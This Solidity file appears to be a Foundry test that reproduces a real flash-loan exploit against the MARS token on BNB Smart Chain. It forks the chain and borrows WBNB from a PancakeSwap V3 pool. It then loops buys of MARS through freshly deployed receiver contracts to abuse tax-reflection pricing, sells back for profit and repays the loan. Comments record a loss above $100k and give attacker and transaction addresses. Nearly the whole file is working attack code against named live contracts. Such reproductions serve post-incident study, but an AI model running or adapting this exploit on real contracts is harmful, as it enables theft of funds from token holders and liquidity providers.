// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../interface.sol";

// Total Lost: >$100k
// Attacker: 0x306174b707ebf6d7301a0bcd898ae1666ec176ae
// Attack Contract: 0x797acb321cb10154aa807fcd1e155c34135483cd
// Attack Contract: 0x797acb321cb10154aa807fcd1e155c34135483cd
// Vulnerable Contract: 0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943
// Attack Tx: https://app.blocksec.com/explorer/tx/bsc/0x25e2af0a55581d5629a933af9fedd3c70e6d0c320f0b72700ca80e5cdd36c80b

// @Analyses
// https://twitter.com/Phalcon_xyz/status/1780150315603701933
// The pair contract can get reflections from taxes. Thus the attacker can user flashloan to repeated swap and sync for better pricing.


IPancakeV3Pool constant v3pair = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
IERC20 constant bnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IPancakeRouter constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
IERC20 constant MARS = IERC20(0x436D3629888B50127EC4947D54Bb0aB1120962A0);

contract MARS_EXP is Test {

    uint lending_amount = 350 ether;

    function setUp() public {
        vm.createSelectFork("bsc", 37903299); // fork BSC at block 37903299
    }

    function testExploit_MARS() public {

        v3pair.flash(address(this),0,lending_amount, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata) external {
        emit log_named_uint("WBNB balance before Attack", bnb.balanceOf(address(this)) / 1 ether);
        
        emit log_string("Buying MARS with WBNB");
        bnb.approve(address(router), 2**256-1);
        MARS.approve(address(router), 2**256-1);

        address[] memory path = new address[](2);
        path[0] = address(bnb);
        path[1] = address(MARS);

        for (uint i =0; ;){
            if (bnb.balanceOf(address(this)) == 0) {
                break;
            }
            uint tobuy = router.getAmountsIn(1000 ether, path)[0];
            TokenReceiver receiver = new TokenReceiver();
            if (bnb.balanceOf(address(this)) > tobuy) {
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(tobuy, 0, path, address(receiver), block.timestamp+1);
                // emit log_named_uint("get MARS", MARS.balanceOf(address(receiver)));
                MARS.transferFrom(address(receiver),address(this),MARS.balanceOf(address(receiver)));
            }else{
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(bnb.balanceOf(address(this)), 0, path, address(receiver), block.timestamp+1);
                // emit log_named_uint("get MARS", MARS.balanceOf(address(receiver)));
                MARS.transferFrom(address(receiver),address(this),MARS.balanceOf(address(receiver)));
                break;
            }
        }
        
        emit log_named_uint("MARS After buying", MARS.balanceOf(address(this)) / 1 ether);
        emit log_named_uint("BNB After buying", bnb.balanceOf(address(this)) / 1 ether);

        path[0] = address(MARS);
        path[1] = address(bnb);
        for (uint i = 0; ;){
            if (MARS.balanceOf(address(this)) == 0) {
                break;
            }            
            if (MARS.balanceOf(address(this)) > 1000 ether) {
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(1000 ether, 0, path, address(this), block.timestamp+1);
            }else{
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(MARS.balanceOf(address(this)), 0, path, address(this), block.timestamp+1);
                break;
            }
        }
        
        emit log_named_uint("WBNB balance After Attack", bnb.balanceOf(address(this)) / 1 ether);
        emit log_named_uint("MARS After Attack", MARS.balanceOf(address(this)) / 1 ether);
        
        bnb.transfer(msg.sender,lending_amount + fee1);
        emit log_named_uint("WBNB balance After Paying back", bnb.balanceOf(address(this)) / 1 ether);

    }

}

contract TokenReceiver {
    constructor() {
        MARS.approve(msg.sender,2**256-1);
    }
}

